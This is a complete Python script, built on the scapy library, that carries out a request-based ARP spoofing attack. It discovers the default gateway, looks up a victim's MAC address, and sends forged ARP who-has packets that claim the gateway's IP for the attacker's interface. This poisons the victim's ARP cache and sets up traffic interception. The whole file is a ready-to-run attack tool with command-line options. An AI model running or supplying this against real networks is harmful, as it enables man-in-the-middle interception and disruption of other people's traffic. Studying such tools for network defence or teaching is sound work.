#!/usr/bin/env python3

"""
Implements a request-based ARP spoofing attack.
"""

import argparse

# supress warning messages
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

def get_mac(iface, ip_addr):
    res, unans = sr(ARP(op=1, hwdst='ff:ff:ff:ff:ff:ff', pdst=ip_addr), retry=2, timeout=5)
    return res[0][1][ARP].hwsrc

def get_gateway(iface):
    """Returns the IP address of the default gateway associated with the given
    interface. Uses an ICMP ping packet with TTL set to 0 to get it."""

    # use an IP address instead of a domain to be useful in cases where no DNS is available
    p = sr1(IP(dst='1.1.1.1', ttl=0) / ICMP() / 'XXXXXXXXXXX', iface=iface)

    # get the gateway mac with an ARP request
    return p.src, get_mac(iface, p.src)


def send_arp_req(iface, **kwargs):
    """Sends an ARP request packet with the specified options through the given
    interface. Available options are dst, src for the ethernet-level addresses,
    psrc and hwsrc for the ARP-level source addresses, and pdst and hwdst for
    the ARP-level destination addresses. The crafted ARP packet has optype =
    'who-has'."""

    arp_params = {k:v for k, v in kwargs.items() if k in ['psrc', 'hwsrc', 'pdst', 'hwdst']}
    ether_params = {k:v for k, v in kwargs.items() if k in ['src', 'dst']}
    req = Ether(**ether_params)/ARP(**arp_params)
    sendp(req, iface=iface)
    return req


def spoof_gateway(iface, **kwargs):
    """Sends an ARP request packet trying to spoof the gateway IP on the
    target's MAC address."""
    kwargs['psrc'], _ = get_gateway(iface)
    kwargs['hwsrc'] = get_if_hwaddr(iface)
    return send_arp_req(iface, **kwargs)

def parse_and_generate_defaults():
    """Parses command line arguments given to the program and/or sets sensible
    defaults for those that are left blank."""

    parser = argparse.ArgumentParser(description = 'Send a request-based ARP spoofing attack')
    parser.add_argument('--victim_addr', nargs='?', help="victim protocol address", default='127.0.0.1')
    parser.add_argument('--victim_eth', nargs='?', help="Victim's Ethernet address (default: 00:00:00:00:00:00 or Ethernet address of victim host)")
    parser.add_argument('--forged_addr', nargs='?', help="forged host protocol address (default: gateway IP address)")
    parser.add_argument('--forged_eth', nargs='?', help="forged Ethernet address (default: interface Ethernet address)")
    parser.add_argument('iface', help="interface to send the ARP packet from", choices=get_if_list())
    parser.add_argument('--eth_src', nargs='?', help="Frame-level source Ethernet address. Defaults to iterface's MAC address.")
    parser.add_argument('--eth_dst', nargs='?', help="Frame-level destination Ethernet address. Defaults to broadcast address.", default="ff:ff:ff:ff:ff:ff")
    parser.add_argument('-v', action='store_true', help="Show verbose output")

    args = parser.parse_args()

    # turn off verbosity unless told otherwise
    if not args.v:
        conf.verb = 0

    if args.eth_src is None:
        args.eth_src = get_if_hwaddr(args.iface)

    if args.forged_addr is None:
        args.forged_addr, _ = get_gateway(args.iface)
        print("No address to forge supplied. Using default gateway (%s)" % args.forged_addr)

    if args.forged_eth is None:
        args.forged_eth = args.eth_src

    if args.victim_addr is not None:
        if args.victim_eth is None:
            # get the Ethernet address of the victim
            try:
                args.victim_eth = get_mac(args.iface, args.victim_addr)
            except IndexError:
                args.victim_eth = 'ff:ff:ff:ff:ff:ff'
                print("Could not get victim Ethernet address (ARP timed out). Using broadcast Ethernet address")

    options = {'src': args.eth_src, 'dst': args.eth_dst, 'psrc':
               args.forged_addr, 'hwsrc': args.forged_eth, 'pdst':
               args.victim_addr, 'hwdst': args.victim_eth}

    return args.iface, options, args


if __name__ == '__main__':
    # parse command line arguments
    iface, options, args = parse_and_generate_defaults()

    # send ARP requet
    req = send_arp_req(iface, **options)

    # print ARP packet info
    print("\nSent spoofed ARP packet to %s (%s) pretending to be %s (%s).\nEthernet "
          "headers: source = %s, destination = %s" % (options['pdst'],
          options['hwdst'], options['psrc'], options['hwdst'],
          options['src'], options['dst']))

    # if requested, print more information
    if args.v:
        print("Detailed packet info:")
        req.show()

